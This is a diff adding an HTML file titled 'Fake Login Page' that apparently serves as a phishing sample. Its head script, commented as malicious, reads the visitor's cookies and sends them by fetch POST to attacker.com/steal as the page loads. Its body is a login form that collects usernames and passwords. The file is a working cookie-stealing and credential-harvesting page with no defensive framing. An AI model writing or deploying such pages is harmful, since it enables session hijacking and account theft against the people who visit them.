@@ -1,0 +1,22 @@
+<!DOCTYPE>
+<html>
+  <head>
+    <title>Fake Login Page</title>
+    <script>
+      // Malicious JavaScript to steal cookies
+      var cookies = document.cookie;
+      fetch('http://attacker.com/steal', {
+        method: 'POST',
+        body: cookies
+      });
+    </script>
+  </head>
+  <body>
+    <h1>Welcome to Fake Login</h1>
+    <form action="/fake-login" method="POST">
+      <input type="text" name="username" placeholder="Username">
+      <input type="password" name="password" placeholder="Password">
+      <button type="submit">Log In</button>
+    </form>
+  </body>
+</html>
